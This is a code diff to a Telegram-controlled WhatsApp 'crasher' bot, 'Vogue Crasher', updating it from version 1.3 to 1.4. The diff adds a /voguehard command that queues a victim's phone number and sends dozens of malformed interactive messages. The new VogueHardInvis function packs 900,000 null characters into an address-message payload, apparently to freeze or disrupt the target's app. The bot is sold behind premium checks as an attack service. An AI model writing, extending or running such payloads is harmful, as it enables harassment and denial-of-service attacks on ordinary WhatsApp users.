@@ -456,23 +456,38 @@ async function destroySocket() {
 const startSesi = async () => {
     console.clear();
     console.log(chalk.bold.yellow(`
-⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
-⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
-⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
-⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
-⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
-⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
-⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
-
+______████ _
+_____██████ _
+____████████__________ ▌
+___███____███_________ █
+___██_______██__________▌
+__███________█__________▌
+__▌●█________█_________█
+__███_______ █_________█
+___██_______█________██
+____█______██______███_ █
+_____▌_____██_____████_█
+__________███___█████_█_█
+________███__██████__█_█
+______███__████____██_█
+_____███_█████_████_█
+____████_██████_███_█__▌
+___████_█ █__███ _█__██_▌
+__█████_████_▌_█_███_▌
+_█████_██___██___██_█
+_█████_███████_███__█__██
+_███_▌███___██____██_███
+_███_▌█████___███__█__█
+_████_▌▌___█__█_██████
+__██████_████__▌_████
+___█████_____████████
+._=--███████████████
+_=--=_-████████████
+=--_=-_=-█████████
 
 » Information:
   Developer: Prince
-  Version: 1.3 Stable
+  Version: 1.4 Stable
   Status: Bot Connected
   `))
     
@@ -615,7 +630,7 @@ The sender session has been successfully initialized and is ready for use.
 ▒█▄▄█ ▒█░▒█ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▄ ▒█░▒█
 » Information:
   Developer: Prince
-  Version: 1.3 Stable
+  Version: 1.4 Stable
   Status: Sender Connected
   `))
             pingInterval = setInterval(() => {
@@ -1570,7 +1585,7 @@ System Information
 
 User        : ${ctx.from.first_name}
 Developer   : @PrinceXVogue
-Version     : 1.3 Stable
+Version     : 1.4 Stable
 Prefix      : /
 Framework   : Javascript
 
@@ -1611,7 +1626,7 @@ System Information
 
 User        : ${ctx.from.first_name}
 Developer   : @PrinceXVogue
-Version     : 1.3 Stable
+Version     : 1.4 Stable
 Prefix      : /
 
 Description
@@ -1771,7 +1786,7 @@ V O G U E  •  C R A S H E R
 ──────────────────────────
 User        : ${ctx.from.first_name}
 Developer   : @PrinceXVogue
-Version     : 1.3 Stable
+Version     : 1.4 Stable
 Prefix      : /
 ──────────────────────────
 
@@ -1845,13 +1860,14 @@ V O G U E • C R A S H E R
 ────────────────────────
 User   : ${ctx.from.first_name}
 Dev    : @PrinceXVogue
-Ver    : 1.3 Stable
+Ver    : 1.4 Stable
 Prefix : /
 ────────────────────────
 
 A N D R O I D
 › /spamandro    → Hard Delay Invisible
-› /hardspam     → Very Hard Delay Invisible
+› /hardspam     → Very Hard Delay Invisible 
+› /voguehard    → Strong Delay Hard Invisible 100%
 › /drainet      → Increase Quota Usage
 
 
@@ -1893,7 +1909,7 @@ ACKNOWLEDGEMENT PANEL
 
 User        : ${ctx.from.first_name}
 Developer   : @PrinceXVogue
-Version     : 1.3 Stable
+Version     : 1.4 Stable
 Prefix      : /
 
 ──────────────────────────
@@ -1999,7 +2015,7 @@ Trash Matrix WhatsApp engine.
 Session Information
 
 Developer     : @PrinceXVogue
-Version       : 1.3 Stable
+Version       : 1.4 Stable
 Prefix        : /
 
 ────────────────────────────
@@ -2050,7 +2066,7 @@ authenticated and is now operational.
 System Information
 
 Developer     : @PrinceXVogue
-Version       : 1.3 Stable
+Version       : 1.4 Stable
 Prefix        : /
 
 ──────────────────────────────
@@ -3901,7 +3917,7 @@ bot.command("info", async (ctx) => {
   Vogue Crasher
 
 › Version
-  1.3 Stable
+  1.4 Stable
 
 › Developer
   @PrinceXVogue
@@ -4091,7 +4107,7 @@ bot.on("callback_query", async (ctx) => {
   Vogue Crasher
 
 › Version
-  1.3 Stable
+  1.4 Stable
 
 › Developer
   @PrinceXVogue
@@ -4597,7 +4613,123 @@ The system was unable to execute the requested module.`
                 "Connection Closed"
             );
         }
-    });
+});
+
+bot.command('voguehard', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
+        let q =
+            ctx.message?.text
+            ?.split(" ")[1];
+
+        if (!q) {
+
+            return ctx.reply(
+`Invalid Format
+
+Usage:
+/voguehard <target_number>
+
+Example:
+/voguehard 628xxxxxxxx`
+            );
+        }
+
+        let clean =
+            q.replace(
+                /[^0-9]/g,
+                ""
+            );
+
+        let target =
+            clean +
+            "@s.whatsapp.net";
+            
+        const jobId =
+            Date.now() +
+            Math.floor(Math.random() * 9999);
+
+        try {
+
+            addQueue({
+                id: jobId,
+                type: "voguehard",
+                target,
+                number: clean,
+                createdAt: Date.now()
+            });
+            
+            const queuePos =
+                spamQueue.findIndex(
+                    x => x.id === jobId
+                ) + 1;
+            
+            const TASK_DURATION =
+                (30 * 4000) +
+                (3 * 60 * 1000);
+            
+            const estimatedMs =
+                (queuePos - 1) *
+                TASK_DURATION;
+            
+            const nextQueueTime =
+                moment(
+                    Date.now() + estimatedMs
+                )
+                .tz("Asia/Jakarta")
+                .format("HH:mm:ss");
+                
+            await ctx.replyWithPhoto(
+                thumbnailUrl,
+                {
+                    caption:
+    `\`\`\`ruby
+V O G U E • C R A S H E R
+────────────────────────
+Q U E U E • S T A T U S
+
+Target      : ${clean}
+Queue       : #${queuePos}
+Next Run    : ${nextQueueTime} WIB
+State       : Added To Queue
+Description : Delay Hard Invisible V2
+────────────────────────
+\`\`\``,
+                    parse_mode:
+                        "Markdown",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                {
+                                    text:
+                                        "Check Target",
+
+                                    url:
+`https://wa.me/${clean}`
+                                }
+                            ]
+                        ]
+                    }
+                }
+            );
+
+            processSpamQueue();
+
+        } catch (error) {
+
+            ctx.reply(
+`Operation Failed
+
+The system was unable to execute the requested module.`
+            );
+
+            console.log(
+                `[VOGUE CRASHER] ${error.message}`
+            );
+
+            await restartBot(
+                "Connection Closed"
+            );
+        }
+});
 
 bot.command('spamandro', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
     
@@ -4758,82 +4890,6 @@ Please verify the target input and system status before retrying.`
         console.log(
             `[VOGUE CRASHER] Execution failed for ${q}`
         );
-        await restartBot("Connection Closed");
-    }
-});
-
-bot.command('spamandro2', checkExecutionLimit, checkPremiumAccess, checkWhatsAppConnection, CheckCooldown, async (ctx) => {
-    
-    let q = ctx.message?.text?.split(" ")[1];
-    
-    if (!q) return ctx.reply(
-        `Invalid Format
-
-Usage:
-/spamandro <target_number>
-
-Example:
-/spamandro 628xxxxxxxx`
-    );
-    
-    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-    
-    try {
-        
-        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
-            caption: `
-\`\`\`ruby
-V O G U E  •  C R A S H E R
-──────────────────────────
-
-EXECUTION STATUS
-
-Target      : ${q}
-Status      : Success
-Description : Android Delay Invisible
-
-──────────────────────────
-\`\`\``,
-            parse_mode: "markdown",
-            reply_markup: {
-                inline_keyboard: [
-                    [{
-                        text: "Check Target",
-                        url: `https://wa.me/${q}`,
-                        style: "primary"
-                    }]
-                ]
-            }
-        });
-        
-        (async () => {
-            
-            const instanceId = Date.now() + Math.random();
-            
-            for (let i = 0; i < 3; i++) {
-                try {
-                    await PriasoloDelay(sock, target);
-                    await sleep(1500)
-                } catch (e) {
-                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
-                    await restartBot("Connection Closed");
-                }
-            }
-            
-            console.log(`[WORKER ${instanceId}] Done for ${q}`);
-            
-        })();
-        
-    } catch (error) {
-        
-        ctx.reply(
-            `Operation Failed
-
-The system was unable to execute the requested module.
-Please verify the target input and system status before retrying.`
-        );
-        
-        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
         await restartBot("Connection Closed");
     }
 });
@@ -5024,6 +5080,60 @@ async function processSpamQueue() {
                     try {
                         
                         await VogueSpamInvis(
+                            sock,
+                            target
+                        );
+                        
+                        console.log(
+                            `[DELAYCOMBO ${id}] Loop ${i + 1}/30`
+                        );
+                        
+                        await sleep(
+                            3000
+                        );
+                        
+                    } catch (e) {
+                        
+                        console.log(
+                            `[DELAYCOMBO ${id}] ${e.message}`
+                        );
+                        
+                        await restartBot(
+                            "Connection Closed"
+                        );
+                        
+                        break;
+                    }
+                }
+            }
+            
+            else if (
+                type === "voguehard"
+            ) {
+                
+                try {
+                    
+                    await VogueBuldo(
+                        sock,
+                        target
+                    );
+                    
+                    console.log(
+                        `[DELAYCOMBO ${id}] Drainet sent`
+                    );
+                    
+                } catch (e) {
+                    
+                    console.log(
+                        `[DELAYCOMBO ${id}] Drainet Error ${e.message}`
+                    );
+                }
+                
+                for (let i = 0; i < 50; i++) {
+                    
+                    try {
+                        
+                        await VogueHardInvis(
                             sock,
                             target
                         );
@@ -5497,29 +5607,28 @@ async function VogueBuldo(sock, target) {
 }
 }
 
-async function PriasoloDelay(sock, target) {
-  var msg = generateWAMessageFromContent(target, {
-    groupStatusMessageV2: {
-      message: {
-        interactiveResponseMessage: {
-          body: {
-            text: "Pria Solo",
-            format: "EXTENSION"
-          },
-          nativeFlowResponseMessage: {
-            name: "address_message",
-            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
-            version: 3
-          }
-        }
-      }
-    }
-  }, { userJid: target });
-
-  await sock.relayMessage(target, msg.message, {
-    participant: { jid: target },
-    messageId: msg.key.id
-  });
+async function VogueHardInvis(sock, target) {
+    var msg = generateWAMessageFromContent(target, {
+        groupStatusMessageV2: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: "Pria Solo",
+                        format: "EXTENSION"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "address_message",
+                        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
+                        version: 3
+                    }
+                }
+            }
+        }
+    }, { userJid: target });
+    await sock.relayMessage(target, msg.message, {
+        participant: { jid: target },
+        messageId: msg.key.id
+    });
 }
 
 
